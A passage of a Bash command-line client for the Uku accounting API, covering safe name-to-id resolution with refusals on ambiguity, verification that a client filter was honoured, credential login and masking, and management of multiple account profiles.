#                   test fixture have always filtered with `--query client_id=`.
#                   `--client` is sugar for exactly that pair — the CLI resolves
#                   the name, the query key is the one already documented.
#
# The query used to find a name is the `--q` that parse_list_flags has always
# sent, on the very endpoint the command already names. No new endpoint, no new
# parameter, no URL route.
#
# THE MATCH RULE, and why it refuses rather than picks: exact (ASCII
# case-insensitive) first, then unique substring. One match is used and SAID
# OUT LOUD with its id. Several matches refuse and list the candidates — the
# same doctrine as --skip-existing, for the same measured reason (a task title
# that looked unique matched 18 records). Nothing else is safe in a tool that
# writes invoices.
#
# "A server that ignores `q` degrades to too many matches" was written here
# once and was NOT true: it holds only when two rows of the returned PAGE
# match. One row on a page of 100 out of a meta.total of 4000 looked unique and
# was written to. What makes the claim true is _refuse_if_truncated, which
# compares meta.total against the rows actually examined — so the honest
# statement is: a lookup that could not see every candidate refuses outright.
_res_path() {
  case "$1" in
    clients)   printf '/api/v3/clients' ;;
    tasks)     printf '/api/v3/tasks' ;;
    time)      printf '/api/v3/time-entries' ;;
    invoices)  printf '/api/v3/invoices' ;;
    members)   printf '/api/v3/members' ;;
    products)  printf '/api/v3/products' ;;
    contracts) printf '/api/v3/contracts' ;;
    projects)  printf '/api/v3/projects' ;;
    *)         printf '' ;;
  esac
}
_name_field() {
  case "$1" in
    clients)  printf 'name' ;;
    tasks)    printf 'title' ;;
    members)  printf 'name' ;;
    products) printf 'name' ;;
    projects) printf 'name' ;;
    *)        printf '' ;;   # invoices/contracts/time: no name column to match
  esac
}
# The resources `uku search` fans out over — the ones that have a name field,
# so a text query has something to mean there.
UKU_SEARCH_RESOURCES="clients tasks members products projects"
_takes_client_filter() {
  case "$1" in
    /api/v3/tasks|/api/v3/time-entries|/api/v3/invoices|/api/v3/contracts|/api/v3/projects) return 0 ;;
    *) return 1 ;;
  esac
}

# _say_resolved TEXT — which record was chosen, on stderr. NOT routed through
# info(): --quiet may silence a ✓, but never the sentence that says which
# record the next command is about to act on.
_say_resolved() { printf '%s %s\n' "$(_green '→')" "$1" >&2; return 0; }

_is_url() { case "$1" in http://*|https://*) return 0 ;; *) return 1 ;; esac; }
# _url_host URL → host[:port], lowercased, userinfo stripped.
_url_host() {
  local u="${1#*://}"
  u="${u%%/*}"; u="${u%%\?*}"; u="${u%%#*}"; u="${u##*@}"
  printf '%s' "$u" | tr '[:upper:]' '[:lower:]'
}
# _url_path URL → the path part, or "".
_url_path() {
  local u="${1#*://}"
  case "$u" in */*) printf '/%s' "${u#*/}" ;; *) printf '' ;; esac
}
# _url_last_id PATH → the LAST id-shaped segment. The command already names the
# resource, so the CLI needs to know nothing about the web app's routes — only
# which segment is an id. `set -f` because an unquoted split would glob.
_url_last_id() {
  local p="${1%%#*}"; p="${p%%\?*}"
  local seg last="" old_ifs="$IFS"
  set -f; IFS='/'
  for seg in $p; do
    [ -n "$seg" ] || continue
    _looks_like_id "$seg" && last="$seg"
  done
  IFS="$old_ifs"; set +f
  printf '%s' "$last"
}

# _ref_clean REF → the ref with surrounding whitespace removed.
#
# A ref arrives from a shell, a copy-paste or an agent's string interpolation,
# and all three produce " Acme Ltd\n" sooner or later. Trimming it is not
# cosmetic: `uku clients patch " " --data …` used to reach the SUBSTRING pass
# with a single space, match every client whose name contains one, resolve to
# the first of them and PATCH it. A ref that is only whitespace names nothing.
_ref_clean() { _trim "$1"; }

# The longest ref this CLI will look at. Two reasons, one number:
#   * a name is a name — no record in an accounting system is called 4 KB of
#     text, so a ref past this length is a mistake or an injection, not a query;
#   * _urlencode is a pure-bash per-character loop, so encoding a ref is
#     QUADRATIC: a 10 KB ref measured 11s of CPU before the CLI sent a 30 KB
#     query string that no server would match anyway.
UKU_REF_MAX=200

# --by-id / --by-name: the user's own answer to "did you mean the id or the
# name?". Empty means "decide by shape", which is the behaviour for a read.
UKU_BY=""

# _resolve_ref RESOURCE ARG [MODE] → sets UKU_REF_ID (dies in the CURRENT
# shell, so never call it inside $( ) — a die there would be swallowed).
#
# MODE is `read` (default) or `write`, and the difference is deliberate and
# documented (`uku help names`, README, the skill):
#
#   read   an id-shaped ref is used as an id, with no request at all. If it was
#          really a name, the worst case is a 404 — nothing is changed.
#   write  an id-shaped ref is ALSO probed for a record whose NAME is that
#          exact string, because `12345678`, `CAFE-1` and `DECADE` are all
#          id-shaped AND all plausible names — a Nordic registry code is how a
#          firm refers to a client every day. If both readings exist, the CLI
#          refuses and the user says which with --by-id / --by-name. One extra
#          GET is a fair price on a write: writes are rare and deliberate, and
#          the alternative is PATCHing a record nobody named.
#
# The probe is DEFERRED (see _ref_probe_now) so that a write refused for want
# of --yes still sends nothing at all.
UKU_REF_ID=""
UKU_REF_PROBE_RES=""
UKU_REF_PROBE_ARG=""
_resolve_ref() {
  local res="$1" arg="$2" mode="${3:-read}"
  UKU_REF_ID=""; UKU_REF_PROBE_RES=""; UKU_REF_PROBE_ARG=""
  arg="$(_ref_clean "$arg")"
  [ -n "$arg" ] || die "that $(_res_one "$res") reference is empty (or only whitespace), so it names nothing. Nothing was sent." "$EX_USAGE" "@@$res.list"
  if [ "${#arg}" -gt "$UKU_REF_MAX" ]; then
    die "that $(_res_one "$res") reference is ${#arg} characters long; the limit is $UKU_REF_MAX. A name that long is a mistake, not a record. Nothing was sent." "$EX_USAGE" "@@$res.list"
  fi
  if _is_url "$arg"; then
    load_creds
    local want got id
    want="$(_url_host "$UKU_BASE")"; got="$(_url_host "$arg")"
    if [ "$got" != "$want" ]; then
      die "that URL is on '$got', but this account talks to '$want'. Nothing was sent — a link from another host can't name a record here." "$EX_USAGE" @@url.host
    fi
    id="$(_url_last_id "$(_url_path "$arg")")"
    [ -n "$id" ] || die "no id-shaped segment in that URL, so it does not name a record. Pass the id, or a URL that ends in one." "$EX_USAGE" @@url.host
    UKU_REF_ID="$id"
    _say_resolved "$(_res_one "$res") $id — the last id in the URL you pasted (host $got)"
    return 0
  fi
  # The user said which meaning they wanted; there is nothing left to decide.
  if [ "$UKU_BY" = "id" ]; then UKU_REF_ID="$arg"; return 0; fi
  if [ "$UKU_BY" = "name" ]; then _resolve_name "$res" "$arg"; return 0; fi
  if _looks_like_id "$arg"; then
    # A read costs nothing: no request, no lookup, no ambiguity. A write queues
    # the collision probe instead — run once the write is actually going ahead.
    UKU_REF_ID="$arg"
    if [ "$mode" = "write" ]; then UKU_REF_PROBE_RES="$res"; UKU_REF_PROBE_ARG="$arg"; fi
    return 0
  fi
  _resolve_name "$res" "$arg"
}

# _ref_probe_now — run the queued id/name collision probe, if any.
#
# Called from write_resource AFTER confirm_write, so a write refused for want
# of --yes still sends nothing; and with UKU_DRY=0, because the probe is a
# harmless GET whose whole purpose is to make the previewed write correct.
_ref_probe_now() {
  local res="$UKU_REF_PROBE_RES" q="$UKU_REF_PROBE_ARG"
  UKU_REF_PROBE_RES=""; UKU_REF_PROBE_ARG=""
  [ -n "$res" ] || return 0
  local fld path
  fld="$(_name_field "$res")"
  [ -n "$fld" ] || return 0   # nothing here has a name, so nothing can collide
  # Same unkeepable-promise rule as _resolve_name: without jq the CLI cannot
  # compare a field exactly, so it cannot prove the ref is unambiguous. It says
  # so and points at the flag that decides, rather than writing on a guess.
  have jq || die "'$q' is id-shaped, but it could also be the $fld of a $(_res_one "$res") — and checking that needs jq, which is not on this box. Pass --by-id to mean the id. Nothing was written." "$EX_USAGE" @@ref.ambiguous
  path="$(_res_path "$res")"
  local rc=0
  _UKU_NO_HEAL=1 UKU_SOFT=1 UKU_DRY=0 do_request GET "$path$(build_query q="$q" limit=100)" || rc=$?
  [ "$rc" = "0" ] || die "could not reach $UKU_BASE to check whether '$q' is also a $(_res_one "$res") name (network error). Nothing was written." "$EX_NET" @@doctor
  check_status "$REPLY_BODY"
  local hits n listing
  hits="$(_match_rows "$REPLY_BODY" "$fld" "$q" exact)"
  n="$(_count_lines "$hits")"
  [ "$n" = "0" ] && return 0
  listing="$(printf '%s' "$hits" | head -n 10 | awk -F'\t' 'NF { printf "    %s  %s\n", $1, $2 }')"
  die "'$q' is id-shaped, but it is ALSO the exact $fld of $n $(_res_n "$n" "$res") — refusing to guess which you meant. Nothing was written.
$listing
Say which: --by-id writes to the $(_res_one "$res") whose id is '$q'; --by-name resolves the $fld." "$EX_USAGE" @@ref.ambiguous
}

# _resolve_name RESOURCE NAME → sets UKU_REF_ID, or dies having written nothing.
_resolve_name() {
  local res="$1" q="$2" fld path
  fld="$(_name_field "$res")"
  if [ -z "$fld" ]; then
    die "'$q' is not an id, and $(_res_many "$res") have no name field this CLI can search — pass the id." "$EX_USAGE" "@@$res.list"
  fi
  # An UNKEEPABLE SAFETY PROMISE without jq (see the jq-degradation rule near
  # have()): the promise is that one record is chosen only when it is
  # unambiguous, and comparing a field exactly is what proves that. Refuse
  # BEFORE any request, so "nothing was sent" is literally true.
  have jq || die "resolving a name needs jq to compare the '$fld' field exactly; without it the CLI would have to guess which record you meant. Pass the id instead. Nothing was sent." "$EX_USAGE" "@@$res.list"
  path="$(_res_path "$res")"
  load_creds; need_auth
  local rc=0
  # UKU_DRY=0 deliberately: this is a READ, and do_request's --dry-run branch
  # prints-and-exits on the FIRST request — which, since resolution moved in
  # front of the write, meant `--dry-run` previewed the resolution GET and
  # exited 0, showing the user a request they did not ask about instead of the
  # write they did. Letting the lookup run is what makes the preview true.
  _UKU_NO_HEAL=1 UKU_SOFT=1 UKU_DRY=0 do_request GET "$path$(build_query q="$q" limit=100)" || rc=$?
  [ "$rc" = "0" ] || die "could not reach $UKU_BASE to look up '$q' (network error). Nothing was sent." "$EX_NET" @@doctor
  check_status "$REPLY_BODY"
  _refuse_if_truncated "$res" "$q" "$REPLY_BODY"

  local rows exact n
  rows="$(_match_rows "$REPLY_BODY" "$fld" "$q" all)"
  exact="$(_match_rows "$REPLY_BODY" "$fld" "$q" exact)"
  n="$(_count_lines "$exact")"
  if [ "$n" = "1" ]; then _use_match "$res" "$exact"; return 0; fi
  if [ "$n" -gt 1 ]; then _refuse_ambiguous "$res" "$q" "exactly" "$exact"; fi

  local partial
  partial="$(_match_rows "$REPLY_BODY" "$fld" "$q" substr)"
  n="$(_count_lines "$partial")"
  if [ "$n" = "1" ]; then _use_match "$res" "$partial"; return 0; fi
  if [ "$n" -gt 1 ]; then _refuse_ambiguous "$res" "$q" "on" "$partial"; fi

  # Nothing matched. What the server's own `q` DID return is the only honest
  # "did you mean" available — it is a suggestion from the API, not a guess.
  local near msg
  near="$(printf '%s' "$rows" | head -n 5 | awk -F'\t' 'NF { printf "    %s  %s\n", $1, $2 }')"
  msg="no $(_res_one "$res") named '$q'."
  [ -n "$near" ] && msg="$msg The closest $(_res_many "$res") that '$q' brought back:
$near"
  die "$msg" "$EX_USAGE" @@search.run "'$q'"
}

# _match_rows BODY FIELD QUERY MODE(exact|substr|all) → "id<TAB>name" lines.
#
# Both halves of this are load-bearing, and both replace something that was
# measurably wrong:
#
#  * THE MATCH HAPPENS IN jq, not in awk. `awk -v v="$q"` processes escape
#    sequences in the assignment, so a ref containing a backslash was compared
#    against something the user never typed: `AB\nCD` could never match the
#    record actually called `AB\nCD`, and the refusal then listed the very
#    record it had refused. The same mechanism can also CREATE a match. jq's
#    --arg is a value, not a program fragment, so neither happens.
#
#  * THE ROW IS CONTROL-CHARACTER-SAFE. `jq -r '"\(.id)\t\(.name)"'` emits a
#    raw newline for a name that contains one, so a client imported as
#    "Acme\nHoldings" became TWO rows: the fragment "Acme" won the match, the
#    write went to that record's id, and the CLI announced a name the record
#    does not have. Imported data with stray newlines and tabs is ordinary.
#    Matching still uses the RAW field; only the row printed is cleaned.
#
# ascii_downcase is jq's only case fold — matching is case-insensitive for
# ASCII and exact for everything else. Said here rather than pretended away.
_match_rows() {
  printf '%s' "$1" | jq -r --arg f "$2" --arg v "$3" --arg m "$4" '
    def clean: gsub("[[:cntrl:]]"; " ");
    ($v | ascii_downcase) as $lv
    | .data[]? | select(type == "object")
    | ((.[$f] // "-") | tostring) as $nm
    | select($m == "all"
             or (if $m == "exact" then ($nm | ascii_downcase) == $lv
                 else (($nm | ascii_downcase) | index($lv)) != null end))
    | "\(((.id // "") | tostring | clean))\t\($nm | clean)"' 2>/dev/null || true
}

# _refuse_if_truncated RESOURCE QUERY BODY — refuse when the lookup saw less
# than the server says exists.
#
# The doctrine one line up ("a server that ignores `q` degrades to too many
# matches — never to acting on the wrong record") only holds when two rows in
# the page match. With `meta.total: 4000` and ONE row on page one, `uku clients
# patch "Smith"` resolved to that row and wrote to it: unique in the page,
# nowhere near unique in the firm. meta.total is already in the body we hold,
# so the check costs nothing — and "I only looked at 100 of 4000" is the
# honest thing to say rather than a match nobody can prove is the only one.
_refuse_if_truncated() {
  local res="$1" q="$2" body="$3" total shown
  total="$(printf '%s' "$body" | jq -r '.meta.total // empty' 2>/dev/null || true)"
  shown="$(printf '%s' "$body" | jq -r '(.data | length) // 0' 2>/dev/null || true)"
  case "$total" in ''|*[!0-9]*) return 0 ;; esac   # no total → nothing to compare
  case "$shown" in ''|*[!0-9]*) shown=0 ;; esac
  [ "$total" -gt "$shown" ] || return 0
  die "looking up '$q' saw $shown of $total $(_res_many "$res") — the other $((total - shown)) were never examined, so no match here can be shown to be the only one. Nothing was written." "$EX_USAGE" @@name.truncated
}

# _count_lines TEXT → the number of non-empty lines (0 for "").
# awk, not `grep -c`: grep exits 1 on no match, and under `set -o pipefail`
# that would make the enclosing assignment fail rather than report zero.
_count_lines() {
  [ -n "$1" ] || { printf '0'; return 0; }
  printf '%s\n' "$1" | awk 'NF { n++ } END { printf "%d", n + 0 }'
}
_use_match() { # RESOURCE "id<TAB>name"
  local id name
  id="$(printf '%s' "$2" | head -n1 | cut -f1)"
  name="$(printf '%s' "$2" | head -n1 | cut -f2)"
  UKU_REF_ID="$id"
  _say_resolved "$(_res_one "$1") $id — $name"
  return 0
}
_refuse_ambiguous() { # RESOURCE QUERY HOW "id<TAB>name…"
  local n listing
  n="$(_count_lines "$4")"
  # the lookup is capped at 100, so at the cap we only know a lower bound
  [ "$n" -ge 100 ] && n="at least $n"
  listing="$(printf '%s' "$4" | head -n 10 | awk -F'\t' 'NF { printf "    %s  %s\n", $1, $2 }')"
  [ "$(_count_lines "$4")" -gt 10 ] && listing="$listing
    …"
  die "$n $(_res_n "$n" "$1") match '$2' $3 — refusing to guess which one you mean. Nothing was sent.
$listing" "$EX_USAGE" @@name.ambiguous
}

# --client: resolve a name once, then send the query key that was already
# documented for these collections. Refused where the records carry no
# client_id, rather than sent anyway and silently ignored by the server.
#
# `client_id` as a FILTER is the one thing in this feature that could not be
# verified offline — the resource map declares no query parameters, and the
# only evidence is that the README, the embedded skill and the fixture have
# always used `--query client_id=…`. So the CLI does not assume it: it
# MEASURES it, on every response (_verify_client_filter). If the endpoint
# honoured the parameter, every row it returns carries that client_id; if it
# ignored it, the rows say so. An unfiltered list handed back as though it
# were an answer is the exact failure this round exists to prevent, so a
# mismatch is an error, not a footnote.
UKU_CLIENT_REF=""
UKU_CLIENT_ID=""
_apply_client_filter() { # PATH
  [ -n "${UKU_CLIENT_REF:-}" ] || return 0
  if ! _takes_client_filter "${1%%\?*}"; then
    die "--client filters records that belong to a client; ${1%%\?*} is not one of those. Use --q to search this endpoint by text." "$EX_USAGE" @@help.root
  fi
  # Same rule as name resolution, and for the same reason: the promise here is
  # "these rows are that client's", and the only thing that can keep it is an
  # exact field comparison. Without jq there is none, so refuse BEFORE sending.
  have jq || die "--client needs jq: the CLI verifies that the API actually applied the filter by comparing client_id on every row returned, and without jq it cannot. Nothing was sent." "$EX_USAGE" @@help.root
  _resolve_ref clients "$UKU_CLIENT_REF"
  UKU_CLIENT_ID="$UKU_REF_ID"
  UKU_QUERY+=("client_id=$UKU_REF_ID")
  return 0
}

# _verify_client_filter BODY — the measurement. One pass over rows we already
# hold; no extra request.
#
#   * a row whose client_id is present and DIFFERENT from the one asked for is
#     proof the filter was not applied → refuse (exit 3, an API-behaviour fact).
#   * a row with no client_id field, or a null one, proves nothing: absence is
#     not a mismatch, and a projection (--fields) or a leaner response shape
#     must not turn into a false alarm.
_verify_client_filter() {
  [ -n "${UKU_CLIENT_ID:-}" ] || return 0
  have jq || return 0   # unreachable: _apply_client_filter already refused
  local bad n sample
  bad="$(printf '%s' "$1" | jq -r --arg want "$UKU_CLIENT_ID" '
    [ .data[]? | select(type == "object") | select(has("client_id"))
      | .client_id | select(. != null) | tostring | select(. != $want) ] | .[]' 2>/dev/null || true)"
  n="$(_count_lines "$bad")"
  [ "$n" = "0" ] && return 0
  sample="$(printf '%s' "$bad" | LC_ALL=C sort -u | head -n 3 | tr '\n' ',' | sed 's/,$//')"
  die "--client asked for client_id=$UKU_CLIENT_ID, but $n of the rows the API returned belong to other clients (client_id $sample). The endpoint did not apply that filter, so this is NOT that client's data — refusing to hand it back as though it were an answer." "$EX_API" @@filter.unhonoured
}
# A write never resolves a name for you: a batch line carries its own fields,
# and guessing a client_id into a body would be inventing data.
_reject_client_ref() { # CONTEXT
  [ -n "${UKU_CLIENT_REF:-}" ] || return 0
  die "--client filters a READ; it cannot be applied to $1 — put client_id in the body instead. Nothing was sent." "$EX_USAGE" @@api.describe
}

# ── what a successful command offers next ────────────────────────────
_after_list() { # PATH BODY
  _wants_extras || return 0
  local rescmd data cnt id
  rescmd="$(_res_cmd "$1")"
  data="$(printf '%s' "$2" | _json_scan field data)"
  cnt="$(printf '%s' "$data" | _json_scan len -)"
  case "$cnt" in ''|-1) cnt="" ;; esac
  if [ -n "$rescmd" ]; then
    if [ "$cnt" = "1" ]; then UKU_SUMMARY="1 $(_res_one "$rescmd")"
    else UKU_SUMMARY="${cnt:-0} $(_res_n "${cnt:-0}" "$rescmd")"; fi
  else
    UKU_SUMMARY="${cnt:-0} record(s)"
  fi
  id="$(_first_id "$data")"
  [ -n "$rescmd" ] && [ -n "$id" ] && _bc_add "@@$rescmd.get" "$id"
  return 0
}
_after_get() { # PATH BODY
  _wants_extras || return 0
  local rescmd id
  rescmd="$(_res_cmd "$1")"; [ -n "$rescmd" ] || return 0
  id="$(_first_id "$(printf '%s' "$2" | _json_scan field data)")"
  [ -n "$id" ] || id="$(_path_id "$1")"
  UKU_SUMMARY="$(_res_one "$rescmd") ${id:-?}"
  case "$rescmd" in
    clients|tasks) [ -n "$id" ] && _bc_add "@@$rescmd.patch" "$id" ;;
  esac
  return 0
}
_after_write() { # METHOD PATH BODY
  _wants_extras || return 0
  local rescmd id verb
  rescmd="$(_res_cmd "$2")"; [ -n "$rescmd" ] || return 0
  id="$(_first_id "$(printf '%s' "$3" | _json_scan field data)")"
  [ -n "$id" ] || id="$(_path_id "$2")"
  case "$1" in POST) verb="created" ;; PATCH|PUT) verb="updated" ;; DELETE) verb="deleted" ;; *) verb="written" ;; esac
  UKU_SUMMARY="$(_res_one "$rescmd") ${id:-?} $verb"
  [ -n "$id" ] && [ "$verb" != "deleted" ] && _bc_add "@@$rescmd.get" "$id"
  return 0
}

# ── Commands ─────────────────────────────────────────────────────────
# Mask fully unless the key is long enough that a prefix+suffix reveals little.
# Real keys are ~73 chars; anything under 20 is shown as dots (a 13-char key
# must never round-trip to itself, per audit N6).
_mask_key() { local k="$1"; if [ "${#k}" -lt 20 ]; then printf '••••'; else printf '%s…%s' "${k:0:9}" "${k: -4}"; fi; }
_trim() { local s="$1"; s="${s#"${s%%[![:space:]]*}"}"; s="${s%"${s##*[![:space:]]}"}"; printf '%s' "$s"; }
# escape for single-quoted shell output ('…' → '\'' )
_sq() { local s="$1"; s="${s//\'/\'\\\'\'}"; printf '%s' "$s"; }

cmd_auth() {
  local sub="${1:-status}"; shift || true
  case "$sub" in
    login)
      # uku auth login [--account NAME] [--company UUID] [--base URL] [--key-stdin]
      local acct="" company="" base="" key_stdin=0
      while [ $# -gt 0 ]; do case "$1" in
        --account) _need_val "$@"; acct="$2"; shift 2 ;;
        --company) _need_val "$@"; company="$2"; shift 2 ;;
        --base) _need_val "$@"; base="$2"; shift 2 ;;
        --key-stdin) key_stdin=1; shift ;;
        *) die "unknown flag for auth login: $1" "$EX_USAGE" ;;
      esac; done
      [ -n "$acct" ] || acct="${UKU_ACCOUNT_CLI:-$(active_profile)}"
      # Base precedence, and it is a CREDENTIAL-DISCLOSURE decision, not cosmetics:
      # the global pre-parse eats `--base` into UKU_BASE_CLI before this function
      # ever sees its argv, so the local --base case above is only reached when
      # the flag came AFTER the subcommand. Honour both, then the env, then the
      # default — otherwise `uku auth login --base http://staging…` validated
      # against, and stored, production, sending the key to the wrong host.
      [ -n "$base" ] || base="${UKU_BASE_CLI:-}"
      [ -n "$base" ] || base="${UKU_BASE_URL:-}"
      [ -n "$base" ] || base="$UKU_BASE_DEFAULT"
      local key=""
      if [ "$key_stdin" = "1" ] || [ -n "${UKU_API_KEY:-}" ] || { [ -n "$company" ] && ! _is_tty; }; then
        # ── non-interactive path (CI / provisioning / agents) ──
        [ -n "$company" ] || die "Non-interactive login needs --company <uuid>." "$EX_USAGE"
        if [ "$key_stdin" = "1" ]; then key="$(_trim "$(cat)")"; else key="${UKU_API_KEY:-}"; fi
        [ -n "$key" ] || die "Non-interactive login needs the key on stdin (--key-stdin) or \$UKU_API_KEY." "$EX_USAGE"
      else
        # ── interactive prompts (reads /dev/tty so it works under curl | sh) ──
        local reply
        printf 'Uku base URL [%s]: ' "$base" >&2; read -r reply < /dev/tty || true; [ -n "$reply" ] && base="$(_trim "$reply")"
        printf 'Company UUID (Uku → Settings → API): ' >&2; read -r company < /dev/tty || true; company="$(_trim "$company")"
        [ -n "$company" ] || die "Company UUID is required." "$EX_USAGE"
        printf 'API key (uku_live_…): ' >&2
        stty -echo < /dev/tty 2>/dev/null || true   # act on the terminal, not stdin (N7)
        read -r key < /dev/tty || true
        stty echo < /dev/tty 2>/dev/null || true; printf '\n' >&2
        key="$(_trim "$key")"
      fi
      [ -n "$key" ] || die "API key is required." "$EX_USAGE"
      # validate BEFORE writing anything — bad creds never hit disk
      UKU_BASE="$base"; UKU_COMPANY="$company"; UKU_KEY="$key"
      do_request GET /api/v3/members
      case "$REPLY_STATUS" in
        2*) : ;;
        401|403) die "Those credentials were rejected (HTTP $REPLY_STATUS). Nothing saved. Check the Company UUID matches the key's company (Settings → API)." "$EX_AUTH" ;;
        *) warn "Could not verify credentials (HTTP $REPLY_STATUS) — saving anyway; run 'uku auth status' later." ;;
      esac
      save_profile "$acct" "$base" "$company" "$key"
      set_active "$acct"
      info "Signed in to account $(_bold "$acct") · key $(_mask_key "$key") · stored 0600 in $UKU_PROFILE_DIR/$acct"
      ;;
    status)
      load_creds
      if [ -z "${UKU_KEY:-}" ]; then
        if [ "${UKU_AGENT:-0}" = "1" ]; then
          _agent_error "account '$UKU_PROFILE' is not signed in" "$EX_AUTH" "$(_bc_render @@auth.login)"
        elif [ "${UKU_JSON:-0}" = "1" ]; then printf '{"account":"%s","signed_in":false}\n' "$UKU_PROFILE"
        else warn "Account '$UKU_PROFILE' is not signed in. Run: uku auth login"; _hint_line "$(_bc_render @@auth.login)"; fi
        exit "$EX_AUTH"
      fi
      do_request GET /api/v3/members
      local valid=false; [ "${REPLY_STATUS:0:1}" = "2" ] && valid=true
      local st_json; st_json="$(printf '{"account":"%s","base":"%s","company":"%s","key_masked":"%s","valid":%s}' \
          "$UKU_PROFILE" "$UKU_BASE" "$UKU_COMPANY" "$(_mask_key "$UKU_KEY")" "$valid")"
      if [ "${UKU_AGENT:-0}" = "1" ]; then
        if [ "$valid" = true ]; then
          _bc_add @@account.list
          _agent_ok "$st_json" "signed in as account '$UKU_PROFILE'"
          return
        fi
        _agent_error "account '$UKU_PROFILE' is stored but the API rejected the key (HTTP $REPLY_STATUS)" "$EX_AUTH" "$(_bc_render @@auth.login)"
        exit "$EX_AUTH"
      fi
      if [ "${UKU_JSON:-0}" = "1" ]; then
        printf '%s\n' "$st_json"
        [ "$valid" = true ] || exit "$EX_AUTH"; return
      fi
      if [ "$valid" = true ]; then
        info "Signed in · account $(_bold "$UKU_PROFILE") → $(_bold "$UKU_BASE")"
        printf '  company: %s\n  key:     %s  %s\n' "$UKU_COMPANY" "$(_mask_key "$UKU_KEY")" "$(_green 'valid')" >&2
      else
        warn "Account '$UKU_PROFILE' stored but the API rejected it (HTTP $REPLY_STATUS)"
        _hint_line "$(_bc_render @@auth.login)"
        exit "$EX_AUTH"
      fi
      ;;
    print-header|print-headers)
      # An honest escape hatch. When `uku api` can't express something (a raw
      # multipart upload, a header the CLI doesn't model), people need the two
      # auth headers — and the alternative is telling them to cat the profile
      # file, which is strictly worse. --dry-run keeps the mask, as everywhere.
      load_creds; need_auth
      local fmt="curl"
      while [ $# -gt 0 ]; do case "$1" in
        --format) _need_val "$@"; fmt="$2"; shift 2 ;;
        --shell) fmt="shell"; shift ;;
        *) die "usage: uku auth print-header [--format curl|shell|plain]" "$EX_USAGE" ;;
      esac; done
      local key="$UKU_KEY"
      if [ "${UKU_DRY:-0}" = "1" ]; then key="$(_mask_key "$UKU_KEY")"; fi
      warn "this prints a LIVE credential on stdout — don't paste it into a chat, a log, or a shared terminal. Prefer: uku api …"
      case "$fmt" in
        curl)  printf 'header = "X-Uku-Company: %s"\nheader = "X-API-Key: %s"\n' "$(_cfg_esc "$UKU_COMPANY")" "$(_cfg_esc "$key")" ;;
        plain) printf 'X-Uku-Company: %s\nX-API-Key: %s\n' "$UKU_COMPANY" "$key" ;;
        shell) printf "export UKU_COMPANY='%s'\nexport UKU_API_KEY='%s'\n" "$(_sq "$UKU_COMPANY")" "$(_sq "$key")" ;;
        *) die "unknown --format '$fmt' (curl|shell|plain)" "$EX_USAGE" ;;
      esac
      ;;
    logout)
      load_creds
      local target="${UKU_ACCOUNT_CLI:-$UKU_PROFILE}" f
      f="$(_profile_path "$target")"
      if [ -f "$f" ]; then rm -f "$f"; info "Signed out of account '$target' (removed profile)."; else warn "No stored credentials for account '$target'."; fi
      _reassign_active "$target"
      ;;
    *) die "Unknown: uku auth $sub  (login|status|logout)" "$EX_USAGE" @@help.topic auth ;;
  esac
}

# ── Accounts — Uku's one-login-many-companies, in the CLI ─────────────
# Keep a real firm and a sandbox side by side; rehearse changes on the
# sandbox, then run the same command against the main account.
cmd_account() {
  local sub="${1:-list}"; shift || true
  case "$sub" in
    list|ls)
      local act; act="$(active_profile)"
      # --agent asks for ONE envelope shape from every command, including the
      # ones that never touch the API — an agent should not have to know which
      # is which. Built in pure bash so it does not depend on jq either.
      if [ "${UKU_AGENT:-0}" = "1" ]; then
        local ag_first=1 ag_name ag_co ag_n=0 ag_out="["
        while IFS= read -r ag_name; do
          [ -z "$ag_name" ] && continue
          ag_co="$(_profile_get "$(_profile_path "$ag_name")" UKU_COMPANY)"
          [ "$ag_first" = "1" ] || ag_out="$ag_out,"; ag_first=0; ag_n=$((ag_n + 1))
          ag_out="$ag_out{\"name\":$(_json_str "$ag_name"),\"company\":$(_json_str "$ag_co"),\"active\":$([ "$ag_name" = "$act" ] && printf 'true' || printf 'false')}"
        done <<EOF
$(list_profiles)
EOF
        ag_out="$ag_out]"
        _agent_ok "{\"active\":$(_json_str "$act"),\"accounts\":$ag_out}" "$ag_n account(s), active '$act'"
        return 0
      fi
      # JSON when piped/--json so the output honors the same contract as everything else (N9)
      if [ "${UKU_JSON:-0}" = "1" ] || ! _is_tty; then
        if have jq; then
          local first=1; printf '{"active":"%s","accounts":[' "$act"
          local name; while IFS= read -r name; do [ -z "$name" ] && continue
            local co; co="$(_profile_get "$(_profile_path "$name")" UKU_COMPANY)"
            [ "$first" = 1 ] || printf ','; first=0
            jq -cn --arg n "$name" --arg c "$co" --argjson a "$([ "$name" = "$act" ] && echo true || echo false)" '{name:$n,company:$c,active:$a}'
          done <<EOF
$(list_profiles)
EOF
          printf ']}\n'
        else
          local name; while IFS= read -r name; do [ -z "$name" ] && continue; printf '%s\t%s\t%s\n' "$([ "$name" = "$act" ] && echo active || echo -)" "$name" "$(_profile_get "$(_profile_path "$name")" UKU_COMPANY)"; done <<EOF
$(list_profiles)
EOF
        fi
        return 0
      fi
      local any=0 name
      while IFS= read -r name; do
        [ -z "$name" ] && continue; any=1
        local co; co="$(_profile_get "$(_profile_path "$name")" UKU_COMPANY)"
        local mark="  "; [ "$name" = "$act" ] && mark="$(_green '●')"
        printf '%s %s  %s\n' "$mark" "$(_bold "$name")" "$(_dim "$co")"
      done <<EOF
$(list_profiles)
EOF
      [ "$any" = "1" ] || warn "No accounts yet. Add one: uku auth login --account <name>"
      ;;
    add)
      # sugar for: uku auth login --account NAME (+ any extra flags)
      local name="${1:-}"; shift || true
      [ -n "$name" ] || die "usage: uku account add <name> [--company <uuid>] [--key-stdin]" "$EX_USAGE"
      _valid_name "$name" || die "Invalid account name '$name' (letters, digits, . _ -)." "$EX_USAGE"
      cmd_auth login --account "$name" "$@"
      ;;
    use|switch)
      local name="${1:-}"
      [ -n "$name" ] || die "usage: uku account use <name>" "$EX_USAGE"
      _require_valid_name "$name"
      [ -f "$(_profile_path "$name")" ] || die "No such account: $name" "$EX_AUTH" @@account.list
      set_active "$name"; info "Now using account $(_bold "$name")."
      ;;
    current|who)
      local act; act="$(active_profile)"
      if [ "${UKU_AGENT:-0}" = "1" ]; then _agent_ok "{\"active\":$(_json_str "$act")}" "active account '$act'"
      elif [ "${UKU_JSON:-0}" = "1" ]; then printf '{"active":"%s"}\n' "$act"
      else printf '%s\n' "$act"; fi
      ;;
    remove|rm)
      local name="${1:-}"
      [ -n "$name" ] || die "usage: uku account remove <name>" "$EX_USAGE"
      _require_valid_name "$name"
      local f; f="$(_profile_path "$name")"
      [ -f "$f" ] || die "No such account: $name" "$EX_AUTH" @@account.list
      rm -f "$f"; info "Removed account '$name'."
      _reassign_active "$name"
      ;;
